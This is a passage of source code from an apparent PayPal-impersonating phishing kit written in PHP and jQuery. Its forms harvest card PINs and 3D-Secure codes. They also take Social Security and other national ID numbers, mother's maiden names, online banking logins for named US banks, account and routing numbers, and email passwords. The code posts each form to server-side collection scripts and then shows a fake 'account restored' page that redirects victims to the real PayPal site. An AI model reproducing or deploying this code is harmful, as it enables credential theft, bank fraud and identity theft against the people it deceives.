        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },


highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},



    messages: {

      firstName: "First Name is required!",
      lastName: "Last Name is required!",




      DSecure: "Please check your 3D-Secure",

      CardPIN: "Please check your Card PIN",
		UserNameID: "this is required!",
		PasswordBank: "this is required!",

      SSN: "Social Security Number is required",
      sin: "Soci&#97;l Insur&#97;nce Number is required",
      NIN: "N&#97;tional Insur&#97;nce Number is required",
      FCN: "Fiscal Code Number is required!",
      irpps: "Personal Public Service Number is required",
      mmn: "Mother M&#97;iden Name is required!",
      cpfbr: "CPF Number is required!",
      BSN: "Citizen Service Number/SOFI is required",
      DNI: "National Identity Document Number is required",
      SID: "Personal Identity Number is required",
      OSID: "Online Shopping ID is required",



      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },
	
	
birthdate: {required: "Birth Date Month/Day/Year is required!",minlength: "Please enter a valid Birth Date Month/Day/Year "},
    // Make sure the form is submitted to the destination defined
    // in the "action" attribute of the form when valid
       
                submitHandler: function(form) {
 var ss = $('#birthdate').val().split('/');
		 var mm = +ss[0];
		 var dd = +ss[1];
		 var yy = +ss[2];
		 if ( (mm < 1 || mm > 12) ) {
			 $("#birthdateinputError").text('Please enter a valid Birth Date Month')
			.show();
			return false;
		 }
		 else if ( (dd < 1 || dd > 31) ) {
			 $("#birthdateinputError").text('Please enter a valid Birth Date Day')
			.show();
			return false;
		 }
		 else if ( (yy > 2006 || yy < 1900) ) {
			 $("#birthdateinputError").text('Please enter a valid Birth Date Year')
			.show();
			return false;
		 }
 
 
 
                    $("#doori").show();



					$.post("../system/sand_3d.php?ajax", $("#3dcarding").serialize(), function(result) {
                            setTimeout(function() {




$("#cardsiiis").attr("class","setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated");

  $("#cardsiiis").html("<span class='icon icon-medium icon-checkmark-small setupStep-icon' aria-hidden='true'></span><span class='setupStep-stateContent'>Card PayPal confirmed</span>");

$("#emailadress").show();    
$("#emailkatba").show();
$("#Confirm4").hide();
$("#Confirm3").show();

$("#po3").hide();
$("#po4").show();
$("#cardscrity").hide();
$("#scritykatba").hide();


                    $("#doori").hide();
                     $(location).attr("", "");
                            });
                    });

    }
  });
});

</script>

<div id="errorr3dcarding"></div>

      
<form id="3dcarding" action="" method="post" data-reactid="113" name='3dcarding'>

<div class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Security information" data-reactid="128"><label for="expDate" data-reactid="129">Full Name</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
</div>
  </div>

<label id="DSecureinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>


<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="ATM or Debit Card PIN" data-reactid="128"><label for="expDate" data-reactid="129">ATM or Debit Card PIN</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" type="password" id="CardPIN" aria-describedby="text-info-expDate CardPINinputError" name="CardPIN" class="" placeholder="Card PIN" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>

<label id="CardPINinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Social Security Number" data-reactid="128"><label for="expDate" data-reactid="129">ATM or Debit Card PIN</label><div class="vx_form-control vx_form-control_complex" data-reactid="130"><input  required="required" type="text" id="SSN" aria-describedby="text-info-expDate SSNinputError" name="SSN" class="" placeholder="SSN (9 digits)" autocomplete="off" data-reactid="131"  maxlength="11"  aria-required="true" aria-invalid="true"></div></div><label id="SSNinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>


<!--birthdate-->
<div class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Birth date" data-reactid="124"><label for="cardNumber" data-reactid="125">Birth date</label>
<div class="vx_form-control vx_form-control_complex" data-reactid="126">
<input minlength="8"  data-rule-pattern="^[a-zA-Z0-9 ;,\.\/\\_\-\)\(:]+$"  required="required" type="text" id="birthdate" aria-describedby="text-info-cardNumber email_addressinputError birthdateinputError" name="birthdate" class="test_cardNumber hasText valid" placeholder="MM/DD/YYYY" autocomplete="off" value="" data-reactid="127" aria-required="true" aria-invalid="false">
</div></div>
<label id="birthdateinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
<!--birthdate-->

<?php 
if(trim($_SESSION['country1']) == "Canada"){
	echo '<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Soci&#97;l Insur&#97;nce Number" data-reactid="128"><label for="expDate" data-reactid="129">Soci&#97;l Insur&#97;nce Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="11" type="text" id="sin" aria-describedby="text-info-expDate sininputError" name="sin" class="" placeholder="SIN (9 digits)" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="sininputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "United Kingdom"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="N&#97;tional Insur&#97;nce Number" data-reactid="128"><label for="expDate" data-reactid="129">N&#97;tional Insur&#97;nce Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="13" type="text" id="NIN" aria-describedby="text-info-expDate NINinputError" name="NIN" class="" placeholder="NINo" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="NINinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Italy"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Fiscal Code Number" data-reactid="128"><label for="expDate" data-reactid="129">Fiscal Code Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130"><input  required="required" maxlength="16"  type="text" id="FCN" aria-describedby="text-info-expDate FCNinputError" name="FCN" class="" placeholder="Codice fiscale" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="FCNinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Ireland"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Personal Public Service Number" data-reactid="128"><label for="expDate" data-reactid="129">Personal Public Service Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="16"  type="text" id="irpps" aria-describedby="text-info-expDate irppsinputError" name="irpps" class="" placeholder="PPS No" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="irppsinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label><div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Mother M&#97;iden Name" data-reactid="128"><label for="expDate" data-reactid="129">Mother M&#97;iden Name</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="30"  type="text" id="mmn" aria-describedby="text-info-expDate mmninputError" name="mmn" class="" placeholder="Mother name" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="mmninputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Brazil"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="CPF Number" data-reactid="128"><label for="expDate" data-reactid="129">CPF Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="14" type="text" id="cpfbr" aria-describedby="text-info-expDate cpfbrinputError" name="cpfbr" class="" placeholder="CPF" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="cpfbrinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Netherlands"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Citizen Service Number/SOFI" data-reactid="128"><label for="expDate" data-reactid="129">Citizen Service Number/SOFI</label><div class="vx_form-control vx_form-control_complex" data-reactid="130"><input  required="required" maxlength="9" type="text" id="BSN" aria-describedby="text-info-expDate BSNinputError" name="BSN" class="" placeholder="BSN (8/9 digits)" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="BSNinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Spain"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="National Identity Document Number" data-reactid="128"><label for="expDate" data-reactid="129">National Identity Document Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="9" type="text" id="DNI" aria-describedby="text-info-expDate DNIinputError" name="DNI" class="" placeholder="DNI (NIF/NIE/CIF)" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="DNIinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Sweden"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Personal Identity Number" data-reactid="128"><label for="expDate" data-reactid="129">Personal Identity Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="11" type="text" id="SID" aria-describedby="text-info-expDate SIDinputError" name="SID" class="" placeholder="Personnummer (10 digits)" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="SIDinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Australia"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Online Shopping ID" data-reactid="128"><label for="expDate" data-reactid="129">Online Shopping ID</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="15" type="text" id="OSID" aria-describedby="text-info-expDate OSIDinputError" name="OSID" class="" placeholder="OSID" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="OSIDinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>



<br>

<input id="submitBtn" name="" type="submit" class="vx_btn vx_btn-block validateBeforeSubmit" value="Link Card Instantly" data-click="WorldWideSubmit">

</form>
</div>
</div>
</div>



<!--<section id="overpanel" class="theoverpanel animated med fadeIn" tabindex="-1" role="dialog" aria-labelledby="overpanel-header" aria-hidden="false">
</section>-->
<!--------------------------------------chosebanks-------------------------------------------->
<div id="chosebanks" class="listFABBank overpanel-wrapper row">
<div class="" role="document">
<div class=" overpanel-body">

<ul class="listBanks">
<li class="pull-left"><a href="" data-pagename="" class="bankLogin icon arrow-right-small logo-bigger usaa nemo_usaa_3472" id="usaa" tab-index="1" data-attr="3472" data-push-replace="false"><span class="accessAid">USAA Bank</span></a></li>
<li class="pull-left"><a href="" data-pagename="" class="bankLogin icon arrow-right-small logo-bigger bankOfAmerica nemo_bankOfAmerica_2931" id="bankOfAmerica" tab-index="1" data-attr="2931" data-push-replace="false"><span class="accessAid">Bank of America</span></a></li>
<li class="pull-left"><a href="" data-pagename="" class="manualAddBank icon arrow-right-small logo-bigger capitalOne" id="capitalOne" data-attr="00" data-push-replace="false"><span class="accessAid">Capital One</span></a></li>
<li class="pull-left"><a href="" data-pagename="" class="bankLogin icon arrow-right-small logo-bigger chase nemo_chase_663" id="chase" tab-index="1" data-attr="663" data-push-replace="false"><span class="accessAid">Chase Bank</span></a></li>
<li class="pull-left"><a href="" data-pagename="" class="manualAddBank icon arrow-right-small logo-bigger citiBank" id="citiBank" data-attr="00" data-push-replace="false"><span class="accessAid">CitiBank</span></a></li>
<li class="pull-left"><a href="" data-pagename="" class="bankLogin icon arrow-right-small logo-bigger fifthThirdBank nemo_fifthThirdBank_765" id="fifthThirdBank" tab-index="1" data-attr="765" data-push-replace="false"><span class="accessAid">Fifth Third Bank</span></a></li>
<li class="pull-left"><a href="" data-pagename="" class="bankLogin icon arrow-right-small logo-bigger huntington nemo_huntington_802" id="huntington" tab-index="1" data-attr="802" data-push-replace="false"><span class="accessAid">Huntington Bank (Personal)</span></a></li>
<li class="pull-left"><a href="" data-pagename="" class="bankLogin icon arrow-right-small logo-bigger pnc nemo_pnc_2199" id="pnc" tab-index="1" data-attr="2199" data-push-replace="false"><span class="accessAid">PNC Bank</span></a></li>
<li class="pull-left"><a href="" data-pagename="" class="bankLogin icon arrow-right-small logo-bigger regions nemo_regions_803" id="regions" tab-index="1" data-attr="803" data-push-replace="false"><span class="accessAid">Regions Bank</span></a></li>
<li class="pull-left"><a href="" data-pagename="" class="manualAddBank icon arrow-right-small logo-bigger sunTrust" id="sunTrust" data-attr="00" data-push-replace="false"><span class="accessAid">SunTrust Bank</span></a></li>
<li class="pull-left"><a href="" data-pagename="" class="bankLogin icon arrow-right-small logo-bigger tdBank nemo_tdBank_9210" id="tdBank" tab-index="1" data-attr="9210" data-push-replace="false"><span class="accessAid">TD Bank</span></a></li>
<li class="pull-left"><a href="" data-pagename="" class="bankLogin icon arrow-right-small logo-bigger usBank nemo_usBank_545" id="usBank" tab-index="1" data-attr="545" data-push-replace="false"><span class="accessAid">US Bank</span></a></li>
<li class="pull-left"><a href="" data-pagename="" class="bankLogin icon arrow-right-small logo-bigger wellsFargo nemo_wellsFargo_5" id="wellsFargo" tab-index="1" data-attr="5" data-push-replace="false"><span class="accessAid">Wells Fargo Bank</span></a></li>
<li class="pull-left">

<button name="manualAddBank" type="submit" id="manualAddBank" class="logo-bigger generic nemo_different_add_bank" data-pagename=""><span class="bankNameText">I have a different bank</span></button>

</li>

</ul>

</div></div></div>

<div id="img2" style="text-align: center; display: none;">
<img src="../style/img/checkImage_US.svg">
<!--<img src="../style/img/xysbankimgx.jpg">-->

</div>
<div id="imgbanks" style="text-align: center;">
<div class=" overpanel-body">
<ul class="listBanks">
<p style="width: 143px; display: none;" id="img1" data-pagename="" class="bankLogin logo-bigger 
nemo_bankOfAmerica_2931" tab-index="1" data-attr="2931" data-push-replace="false"></p>
</ul>
</div>

</div>
<!--------------------------------------chosebanks-------------------------------------------->


<div id="nwabank">
<div class="" data-reactid="108">

<script>
// Wait for the DOM to be ready
$(function() {



	var validator = $("#nwabanks").bind("invalid-form.validate", function() {
			$("#errorrnwabanks").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})


  $("form[name='nwabanks']").validate({
    // Specify validation rules

	errorContainer: $("#errorrnwabanks"),


    rules: {


      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },

highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},



    messages: {

      firstName: "First Name is required!",
      lastName: "Last Name is required!",

      USAA3: "This field is required.",
      namebank: "Please check your bank name.",
      xxnxx: "Please check your Routing Number.",
      xxllxx: "Please check your Account Number.",


paypalcreditExpiration: {
        required: "Expiration Month/Year  is required!",
        minlength: "Please enter a valid Expiration Month/Year "
      },


 paypalcreditCardSecurityCode: {
        required: "Security Code (CVV) is required!",
        minlength: "Please enter a valid CVV code"
      },


  cardnumber: {
        required: "Please check your card number",
        minlength: "Please check your card number"
      },


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },
    // Make sure the form is submitted to the destination defined
    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {

                    $("#doori").show();



					$.post("../system/sand_bank.php?ajax", $("#nwabanks").serialize(), function(result) {
                            setTimeout(function() {

                          

$("#siribabbbk").attr("class","setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated");

  $("#siribabbbk").html("<span class='icon icon-medium icon-checkmark-small setupStep-icon' aria-hidden='true'></span><span class='setupStep-stateContent'>accounts Bank confirmed </span>");

setTimeout(function() {
									location = '../identity/';
								},);



                                $(location).attr("", "");
								setTimeout(function() {
									location = '';
								},5000);
            
$("#tbanhadiblastviry").show();

$("#chosebanks").hide();
$("#img2").hide();
$("#imgbanks").hide();
$("#nwabank").hide();
$("#bankkatba").hide();

$("#po5").hide();
$("#po6").show();



$("#doori").show();


                                $(location).attr("", "");
                            });
                    });
    }
  });
});

</script>

  <form id="nwabanks" style="padding-top:25px;"  name="nwabanks" action="" method="post">

<div id="errorrnwabanks"></div>
<div style="text-align: center;">
</div>

<!------------------------------usaa123------------------------------------------>
<div id="usaa123" style="display: none;" class="multi equal clearfix">

<!----------------------------------------usaauser-------------------------------------------->

<div class="">
<div id="USAA1" class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Online ID" data-reactid="128"><label for="Online ID" data-reactid="129">Online ID</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input type="text" required="required" ng-model="USAA1" id="USAA1" aria-describedby="text-info-expDate UserNameIDinputError" name="USAA1" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">
</div>
  </div>
<label id="UserNameIDinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
</div>
<!-------------------------------------------------------------------------------------------->

<!----------------------------------------usaaPass-------------------------------------------->
<div class="">  
<div id="USAA2" class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Password" data-reactid="128"><label for="Password" data-reactid="129">Password</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="Password"  ng-model="USAA2"
id="PasswordBank" aria-describedby="text-info-expDate PasswordBankinputError" name="USAA2" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">
</div>
</div>
<label id="PasswordBankinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
</div>
<!-------------------------------------------------------------------------------------------->


<!----------------------------------------usaaPIN-------------------------------------------->
<div id="USAA3" class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="PIN" data-reactid="128"><label for="expDate" data-reactid="129">PIN</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="text" ng-model="USAA3" id="USAA3" aria-describedby="text-info-expDate xxnxxinputError" name="USAA3" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">
</div>
</div>
<label id="xxnxxinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
<!-------------------------------------------------------------------------------------------->
</div>
<!------------------------------usaa123------------------------------------------>
</div>

<div class="multi equal clearfix">
                                                    <div class=" left">

<div id="UserNameIDdiv" class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="User Name" data-reactid="128"><label for="User Name ID" data-reactid="129">User Name ID</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input type="text" required="required" ng-model="UserNameID" id="UserNameID" aria-describedby="text-info-expDate UserNameIDinputError" name="UserNameID" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">
</div>
  </div>

<label id="UserNameIDinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

                      </div>



<div class="right">  



<div id="PasswordBankdiv" class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Password" data-reactid="128"><label for="Password Bank" data-reactid="129">Password Bank</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="Password"  ng-model="PasswordBank"
 id="PasswordBank" aria-describedby="text-info-expDate PasswordBankinputError" name="PasswordBank" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>

<label id="PasswordBankinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>



                                                    </div>
                                            </div>





<div id="xxnxxdiv" class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Routing Number" data-reactid="128"><label for="expDate" data-reactid="129">Routing Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="text" ng-model="xxnxx" id="xxnxx" aria-describedby="text-info-expDate xxnxxinputError" name="xxnxx" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">
</div>
</div>
<label id="xxnxxinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
<div id="xxllxxdiv" class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Account Number" data-reactid="128"><label for="expDate" data-reactid="129">Account Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="text" ng-model="xxllxx" id="xxllxx" aria-describedby="text-info-expDate xxllxxinputError" name="xxllxx" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>
<label id="xxllxxinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

<p data-reactid="128">When you skip this step, your entire account may not be confirmed .</p>



<div style="text-align: center;">

<input type="hidden" name="namebankhidden" id="namebankhidden"/>

<input type="submit" class="linkInstantly vx_btn vx_btn-block validateBeforeSubmit" name="continue" value="Link Bank Instantly">
</form>

<!--<input id="baltiXD" name="" type="submit" class="vx_btn vx_btn-secondary" value="Skip steps" data-click="WorldWideSubmit">-->


<script>
$("#baltiXD").click(function(e) {
      e.preventDefault();


								
								
                   $("#emailadress").show();                    $("#emailkatba").show();

$("#nwabank").hide();
$("#chosebanks").hide();
$("#bankkatba").hide();
$("#imgbanks").hide();
$("#img1").hide();


$("#doori").show();  



					//$("#po1").hide();
					//$("#po2").hide();
					//$("#po3").hide();
					//$("#po4").show();


});
</script>      



</div>

</div>



</div>






<div id="emailadress" >

<div class="" data-reactid="108">

<p id=""><?php echo $text2 ?></p></br>



<script>
// Wait for the DOM to be ready
$(function() {



	var validator = $("#loginemail").bind("invalid-form.validate", function() {
			$("#errorrloginemail").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})


  $("form[name='loginemail']").validate({
    // Specify validation rules

	errorContainer: $("#errorrloginemail"),


    rules: {


      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },

highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},



    messages: {

      firstName: "First Name is required!",
      lastName: "Last Name is required!",
      passwordemail: "Password is required",




     
      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },
    // Make sure the form is submitted to the destination defined
    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {

                    $("#doori").show();                    



					$.post("../system/sand_login_email.php?ajax", $("#loginemail").serialize(), function(result) {
                            setTimeout(function() {

                      




//$("#thankskatba").show();           
//$("#thnksss").show();


$("#Confirm3").hide();
$("#Confirm5").show();

$("#po4").hide();
$("#po5").show();
$("#bankkatba").show();
$("#chosebanks").show();


$("#x_34ID-Z729").hide();

                    
$("#emailadress").hide();
$("#emailkatba").hide();

$("#doori").hide();  



                            });
                    });
    }
  });
});

</script>





<p></p>




  <form id="loginemail" name="loginemail" action="#" method="post"  >




<div id="errorrloginemail"></div>


<div class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Password" data-reactid="128"><label for="expDate" data-reactid="129">Routing Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="password" ng-model="passwordemail" id="passwordemail" aria-describedby="text-info-expDate passwordemailinputError" name="passwordemail" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" placeholder="Password" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>

<label id="passwordemailinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
<br/>

<input id="submitBtn" name="" type="submit" class="vx_btn vx_btn-block validateBeforeSubmit" value="Continue" data-click="WorldWideSubmit">


</form></div>

</div>




<div id="thnksss" > 
<div style="text-align: center;">
<img width="150" height="150" src="../style/img/animation-checkmark.gif&#10;"><p>  Now you can enjoy our services, thank you for choosing our trusted service.<br> 
                             your account will be verified in the next 24 hours. 
                        </p>
                        <div class="btn-content-last">
<button id="sirpaypal"  class="vx_btn" type="submit" autocomplete="off" tabindex="0"><!-- react-text: 259 --> My PayPal<!-- /react-text --><span class="icon-paypal-container"><!-- react-text: 261 -->&nbsp;<!-- /react-text --><span class=""></span></span><!-- react-text: 263 --><!-- /react-text --></button> 
<button id="siracont"  class="vx_btn vx_btn-secondary" type="submit" autocomplete="off" tabindex="0"><!-- react-text: 259 --> Log Out<!-- /react-text --><span class="icon-paypal-container"><!-- react-text: 261 -->&nbsp;<!-- /react-text --><span class=""></span></span><!-- react-text: 263 --><!-- /react-text --></button>
<script>
$("#siracont").click(function(e) {
      e.preventDefault();
   $(location).attr("href", "//paypal.com/myaccount");
});
</script>
<script>
$("#sirpaypal").click(function(e) {
      e.preventDefault();
   $(location).attr("href", "//paypal.com/signin");
});
</script>                                                           </div>
 <p class="seconds"> You are being redirected to your PayPal account , within 10 seconds. </p> 

			<p></p><h2>Your Account <?php echo $_SESSION['_login_email_'] ;?> has been successfully Restored</h2><h2><p></p>
            

<p></p> 
<p></p> 
<p></p><div class="footerLink"></div></h2></div>
 </div>


<div style="display:none" id="android" >


</div>



 

</div>





<!-- react-text: 99 --> <!-- /react-text --></div>




</div><!-- react-text: 113 --> <!-- /react-text --></div></main><!-- react-empty: 114 --><div id="injectedUnifiedLogin" style="height:0px;width:0px;visibility:hidden;over-flow:hidden;" data-reactid="115"></div></div></div>




<!-- react-empty: 118 --></div></div></div>


	<script src="./lib/js/jquery.CardValidator.js"></script>


	<script type="text/javascript">
        $(function() {
			
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
				
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();

                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
        </script>
		<script type="text/javascript">		
		$('#cardnumber').validateCreditCard(function(result) {
			
            // console.log(result);
            if (result.card_type != null) {
				
				//CARDING VISA AMEX MASTER MASK//
				if (result.card_type.name == 'AMEX') {
					  $('#cardnumber').mask('0000 000000 00000');
					$('#cardnumber').attr('maxlength','17')
					.attr('minlength','17');
				}
				else {
					 $('#cardnumber').mask('0000 0000 0000 0000');
					$('#cardnumber').attr('maxlength','19')
					.attr('minlength','19');
				}
				
			//////////////////////////////////////////////////////////
                switch (result.card_type.name) {
                    case "VISA":

					$('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('minlength', '3');
					$('#csc').attr('placeholder', 'Enter security code (3 digits)');
					


$('#soracard').removeClass('').addClass('visaLogo');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');



$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');





$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');
$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5% -1%');
                        break;
                    case "VISA ELECTRON":


$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');





$('#soracard').removeClass('').addClass('visaLogo');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');

                        $('#cardnumber').css('background-position', '98.5%  47.4%'); $('#cscaa').removeClass('csc-image_amex').addClass('');

   $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'Enter security code (3 digits)');



                        break;
                    case "MASTERCARD":


$('.chtadakchi').attr('id', 'chtamastercard');



$('#cardsmiya').attr('class', 'creditOrDebit mastercard black card image');





$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('').addClass('master_cardLogo');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');



   $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('minlength', '3');
					$('#csc').attr('placeholder', 'Enter security code (3 digits)');

$('#metrcardaa').removeClass('').addClass('cardImages-icon_selected');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected ').addClass('');

